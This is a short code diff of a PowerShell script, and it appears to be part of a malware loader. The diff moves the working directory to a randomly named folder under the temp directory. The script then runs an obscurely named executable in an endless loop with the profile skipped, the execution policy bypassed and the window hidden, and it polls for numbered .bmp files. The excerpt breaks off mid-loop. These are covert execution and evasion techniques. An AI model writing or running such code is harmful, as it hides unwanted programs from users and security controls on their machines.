@@ -1,5 +1,5 @@
 $count=0
-$curr_dir=(Get-Location).Path
+$curr_dir="$env:temp\QKlYTmHhCDy"
 while($true){
     powershell -noP -ep bypass -w hidden "$curr_dir\KJUwHZlCNV.exe"
     while(Test-Path -Path "$curr_dir\TmreCWpLEnhx${count}.bmp"){
